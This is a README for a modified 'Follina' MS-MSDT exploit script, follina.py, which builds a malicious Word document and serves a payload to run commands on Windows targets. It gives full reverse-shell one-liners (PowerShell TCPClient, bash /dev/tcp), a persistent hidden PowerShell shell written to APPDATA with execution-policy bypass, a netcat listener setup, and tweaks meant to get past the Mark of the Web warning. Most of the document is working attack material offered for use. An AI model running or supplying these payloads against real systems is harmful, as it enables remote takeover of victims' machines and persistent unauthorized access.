# MS-MSDT "Follina" Attack Vector, Updated Version 2025

## Edited/Added:

- Fixed Options error in TCP Server log
- Added Copy of doc file to Http Server for directly download payload
- Added some Text to doc file for "maybe easy" bypassing Mark of the Web info banner
- Added new native PS Reverse Shell via `--reverse 5555` Parameter for bypassing nc problems
- Some extra stuff in codebase


## Run Script

- Download [Win10_21H2_English_x32.iso (Build 19044.1288)](https://archive.org/download/Win10_21H2_English_x32/Win10_21H2_English_x32.iso)
- Install/Run on Virtualbox or other VM
- Download Office 32bit (ODT not working for me at this point)
- `bitsadmin /TRANSFER O13DL /DOWNLOAD /PRIORITY high https://ia803209.us.archive.org/29/items/microsoft-office-2013-pro-plus-sp-1-english-32-bit_202005/Microsoft-Office-2013-Pro-Plus-SP1-English-32Bit.zip C:\office32.zip`
- Unzip and run follina.py

## Run

```bash
# Calc only
python3 follina.py -i eth0 -p 8008
```
---

```bash
# Multiple programs and MsgBox
python3 follina.py -i enp0s3 -p 8008 -c 'calc ; winver ; Add-Type -AssemblyName "System.Windows.Forms"; [System.Windows.Forms.MessageBox]::Show("This is Follina PoC Edit by suuhm 2025", "Follina PoC", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Warning, [System.Windows.Forms.MessageBoxDefaultButton]::Button1, [System.Windows.Forms.MessageBoxOptions]::DefaultDesktopOnly) ; notepad'
```

## Reverse Shells

```bash
# New Alter-Native Reverse shell
python3 follina.py -i enp0s3 -p 8008 -r 5555
```

--- 

```bash
ip a; nc -lnvp <WISHED_PORT> 

# Using native Reverse LOLBIN shell
python3 follina.py -i enp0s3 -p 8008 -c '$c=New-Object System.Net.Sockets.TCPClient("<REMOTE_IP_HOSTNAME>",<WISHED_PORT>);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex ". { $d } 2>&1"|Out-String)+"PS "+(pwd).Path+"> ";$sb=[text.encoding]::ASCII.GetBytes($r);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()'


# For mysys/cygwin systems etc...
python3 follina.py -i enp0s3 -p 8008 -c "export RHOST=<RHOST_IP>;export RPORT=5555;bash -c 'exec bash -i &>/dev/tcp/$RHOST/$RPORT <&1'"
```

---

### Persistent Reverse Shell
#### Still open after closing parent word process

```bash
python3 follina.py -i enp0s3 -p 8001 -c 'cd $env:APPDATA;echo "`$c=New-Object System.Net.Sockets.TCPClient(`"<REMOTE_IP_HOSTNAME>`",5555);`$s=`$c.GetStream();[byte[]]`$b=0..65535|%{0};while((`$i=`$s.Read(`$b,0,`$b.Length))-ne 0){`$d=(New-Object System.Text.ASCIIEncoding).GetString(`$b,0,`$i);`$r=(iex `". { `$d } 2>&1`" | Out-String)+`"PS `"+(pwd).Path+`"> `";`$sb=[text.encoding]::ASCII.GetBytes(`$r);`$s.Write(`$sb,0,`$sb.Length);`$s.Flush()};`$c.Close()">t.ps1;Start powershell -WindowStyle Hidden -ArgumentList "-ep Bypass -f t.ps1"'
```


---


![grafik](https://github.com/user-attachments/assets/6adefab8-b657-4e98-bcd8-37d83db8387a)



---

> John Hammond | May 30, 2022

--------------

Create a "Follina" MS-MSDT attack with a malicious Microsoft Word document and stage a payload with an HTTP server.

![Screenshot](https://user-images.githubusercontent.com/6288722/171033876-dbe73e3e-0a3a-436a-91d8-7fa77a5c1ace.png)

# Usage

```
usage: follina.py [-h] [--command COMMAND] [--output OUTPUT] [--interface INTERFACE] [--port PORT]

options:
  -h, --help            show this help message and exit
  --command COMMAND, -c COMMAND
                        command to run on the target (default: calc)
  --output OUTPUT, -o OUTPUT
                        output maldoc file (default: ./follina.doc)
  --interface INTERFACE, -i INTERFACE
                        network interface or IP address to host the HTTP server (default: eth0)
  --port PORT, -p PORT  port to serve the HTTP server (default: 8000)
```

# Examples

Pop `calc.exe`:

```
$ python3 follina.py   
[+] copied staging doc /tmp/9mcvbrwo
[+] created maldoc ./follina.doc
[+] serving html payload on :8000
```

Pop `notepad.exe`:

```
$ python3 follina.py -c "notepad"
```

Get a reverse shell on port 9001. **Note, this downloads a netcat binary _onto the victim_ and places it in `C:\Windows\Tasks`. It does not clean up the binary. This will trigger antivirus detections unless AV is disabled.**

```
$ python3 follina.py -r 9001
```

![Reverse Shell](https://user-images.githubusercontent.com/6288722/171037880-03a73d6a-4606-4c42-abcb-ee52a9e669c6.png)
